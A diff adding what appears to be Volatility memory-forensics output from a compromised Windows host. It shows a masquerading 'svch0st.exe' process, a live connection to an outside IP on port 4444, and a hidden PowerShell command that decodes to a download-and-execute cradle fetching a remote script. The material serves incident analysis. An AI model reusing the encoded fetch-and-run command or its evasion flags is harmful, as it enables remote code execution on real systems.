@@ -1,0 +1,14 @@
+$ vol -f dump.mem windows.pstree
+PID    PPID   ImageFileName      CreateTime
+988    812    services.exe       2026-08-20 09:00:05
+1024   988    svchost.exe        2026-08-20 09:00:06
+4444   988    svch0st.exe        2026-08-20 09:14:22
+5210   4444   powershell.exe     2026-08-20 09:14:30
+
+$ vol -f dump.mem windows.netscan
+Proto  LocalAddr        ForeignAddr        State        PID
+TCP    10.0.0.5:49732   185.220.101.7:4444 ESTABLISHED  4444
+
+$ vol -f dump.mem windows.cmdline
+PID    Process            Args
+5210   powershell.exe     powershell.exe -nop -w hidden -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQA4ADUALgAyADIAMAAuADEAMAAxAC4ANwAvAHAALgBwAHMAMQAnACkA
